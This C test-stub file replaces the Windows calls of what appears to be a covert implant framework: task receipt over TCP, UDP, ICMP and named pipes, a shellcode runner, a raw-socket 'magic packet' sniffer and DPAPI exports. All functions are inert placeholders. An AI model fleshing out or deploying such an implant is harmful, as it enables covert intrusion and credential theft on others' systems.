/*
 * sw_stub.c - native-test shims for the Win32 calls and the
 * Windows-only modules (DLL_main, the 7 dpapi exports, the raw-socket
 * sniffing, the named pipes, VirtualProtect). Link this with
 * sw_core.c + sw_bytecode.c for a runnable native test binary.
 */
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>

#include "sw_core.h"
#include "sw_impl.h"

int sw_worker_start(void) {
    return 0;
}

uint32_t sw_random_u32(void) {
    static volatile int seed = 1;
    return (uint32_t)(seed ^ (uintptr_t)time(NULL) ^ (uintptr_t)getpid()
                      ^ ((uintptr_t)&seed) << 1);
}

/* Network ops (the tests exercise the framing and the crypto, not the
 * real sockets). The send ops return 0 (success) when they have
 * something to do; the receive ops return -1 (no peer) on the host. */
int sw_tcp_send(const char *la, const char *lp,
                const char *rh, const char *rp,
                const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)la; (void)lp; (void)rh; (void)rp; (void)dl;
    return blen > 0 ? 0 : -1;
}
int sw_udp_send(const char *la, const char *lp,
                const char *rh, const char *rp,
                const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)la; (void)lp; (void)rh; (void)rp; (void)dl;
    return blen > 0 ? 0 : -1;
}
int sw_icmp_send(const char *src, const char *dst,
                 const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)src; (void)dst; (void)dl;
    return blen > 0 ? 0 : -1;
}
int sw_pipe_send(const char *server, const char *pipe,
                 const char *user, const char *pass,
                 const uint8_t *blob, uint32_t blen, uint16_t dl) {
    (void)server; (void)pipe; (void)user; (void)pass; (void)dl;
    return blen > 0 ? 0 : -1;
}
int sw_tcp_connect_recv(const char *la, const char *lp,
                        const char *rh, const char *rp, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen) {
    (void)la; (void)lp; (void)rh; (void)rp; (void)dl;
    (void)task; (void)cap; if (tlen) *tlen = 0;
    return -1;
}
int sw_tcp_listen_recv(const char *a, const char *b, uint16_t dl,
                       uint8_t *task, uint32_t cap, uint32_t *tlen) {
    (void)a; (void)b; (void)dl;
    (void)task; (void)cap; if (tlen) *tlen = 0;
    return -1;
}
int sw_udp_bind_recv(const char *a, const char *b, uint16_t dl,
                     uint8_t *task, uint32_t cap, uint32_t *tlen) {
    (void)a; (void)b; (void)dl;
    (void)task; (void)cap; if (tlen) *tlen = 0;
    return -1;
}
int sw_pipe_client_recv(const char *server, const char *pipe,
                        const char *user, const char *pass, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen) {
    (void)server; (void)pipe; (void)user; (void)pass; (void)dl;
    (void)task; (void)cap; if (tlen) *tlen = 0;
    return -1;
}
int sw_pipe_server_recv(const char *pipe, const char *reserved, uint16_t dl,
                        uint8_t *task, uint32_t cap, uint32_t *tlen) {
    (void)pipe; (void)reserved; (void)dl;
    (void)task; (void)cap; if (tlen) *tlen = 0;
    return -1;
}

int sw_run_shellcode(const uint8_t *code, uint32_t len) {
    (void)code;
    return len > 0 ? 0 : -1;
}
int sw_run_file_script(const char *path) {
    (void)path;
    return -1;
}
int sw_sniff_magic(const char *iface, uint32_t deadline, int mode, int depth) {
    (void)iface; (void)mode; (void)depth;
    for (volatile int i = 0; i < (int)deadline && i < 24; i++)
        usleep(50 * 1000);
    return 0;
}
